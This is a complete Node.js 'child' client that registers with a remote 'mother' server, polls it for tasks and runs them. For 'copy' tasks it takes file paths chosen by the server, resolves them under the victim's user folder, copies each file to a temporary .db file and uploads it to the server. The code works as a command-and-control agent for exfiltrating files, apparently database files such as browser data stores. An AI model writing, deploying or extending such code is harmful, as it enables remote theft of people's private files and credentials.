// child.js – Minimal child client for ytrixcity mother
require('dotenv').config();
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const os = require('os');
const glob = require('glob');
const FormData = require('form-data');

const MOTHER_URL = process.env.MOTHER_URL;
const API_KEY = process.env.API_KEY;

if (!MOTHER_URL || !API_KEY) {
    console.error('❌ Missing MOTHER_URL or API_KEY in .env');
    process.exit(1);
}

let authToken = null;
let childId = null;
let retryCount = 0;
const MAX_RETRIES = 5;

function expandPath(src) {
    let p = src.replace(/%USERNAME%/g, os.userInfo().username);
    if (!path.isAbsolute(p)) p = path.join(os.homedir(), p);
    if (p.includes('*')) {
        const matches = glob.sync(p);
        return matches.length ? matches[0] : null;
    }
    return p;
}

// Register using API key
async function register() {
    try {
        const res = await axios.post(`${MOTHER_URL}/api/register-with-key`, { apiKey: API_KEY }, { timeout: 10000 });
        childId = res.data.childId;
        authToken = res.data.authToken;
        console.log('✅ Registered with mother');
        retryCount = 0;
        return true;
    } catch (err) {
        if (err.response) {
            if (err.response.status === 401) console.error('❌ Invalid/expired API key');
            else console.error(`❌ Registration failed: ${err.response.status}`);
        } else {
            console.error(`❌ Registration error: ${err.message}`);
        }
        retryCount++;
        return false;
    }
}

// Heartbeat
async function heartbeat() {
    if (!authToken) return;
    try {
        const res = await axios.post(`${MOTHER_URL}/api/heartbeat`, { childId }, {
            headers: { Authorization: `Bearer ${authToken}` },
            timeout: 10000
        });
        if (res.data.newToken) authToken = res.data.newToken;
    } catch { /* silent */ }
}
setInterval(heartbeat, 60000);

// Get next task
async function getTask() {
    if (!authToken) return null;
    try {
        const res = await axios.get(`${MOTHER_URL}/api/task`, {
            headers: { Authorization: `Bearer ${authToken}` },
            timeout: 10000
        });
        if (res.data.newToken) authToken = res.data.newToken;
        return res.data;
    } catch (err) {
        if (err.response && err.response.status === 401) {
            authToken = null;
            return { type: 're-register' };
        }
        return null;
    }
}

// Send result
async function sendResult(filePath, caption, step) {
    if (!authToken) throw new Error('No auth token');
    const form = new FormData();
    if (filePath && fs.existsSync(filePath)) form.append('file', fs.createReadStream(filePath));
    form.append('step', step);
    form.append('caption', caption);
    try {
        const res = await axios.post(`${MOTHER_URL}/api/result`, form, {
            headers: { ...form.getHeaders(), Authorization: `Bearer ${authToken}` },
            timeout: 30000
        });
        if (res.data.newToken) authToken = res.data.newToken;
        return true;
    } catch (err) {
        if (err.response && err.response.status === 401) authToken = null;
        throw err;
    }
}

// Execute task
async function executeTask(task) {
    if (!task) return;
    switch (task.type) {
        case 'wait': await new Promise(r => setTimeout(r, 5000)); break;
        case 'done': console.log('✅ All tasks done'); process.exit(0); break;
        case 're-register': authToken = childId = null; break;
        case 'copy':
            console.log(`📋 Copying ${task.caption}`);
            const src = expandPath(task.source);
            if (!src || !fs.existsSync(src)) {
                await sendResult(null, task.caption, task.step);
                return;
            }
            const tmp = path.join(os.tmpdir(), `tmp_${Date.now()}.db`);
            fs.copyFileSync(src, tmp);
            try {
                await sendResult(tmp, task.caption, task.step);
                console.log(`✅ ${task.caption} done`);
            } finally { fs.unlinkSync(tmp); }
            break;
        default: console.log(`⚠️ Unknown task type: ${task.type}`);
    }
}

// Main loop
(async function main() {
    console.log('🚀 Child starting...');
    while (true) {
        if (!authToken) {
            if (!await register()) {
                if (retryCount > MAX_RETRIES) process.exit(1);
                await new Promise(r => setTimeout(r, 5000 * retryCount));
                continue;
            }
        }
        const task = await getTask();
        if (!task) { await new Promise(r => setTimeout(r, 10000)); continue; }
        await executeTask(task);
        await new Promise(r => setTimeout(r, 2000));
    }
})();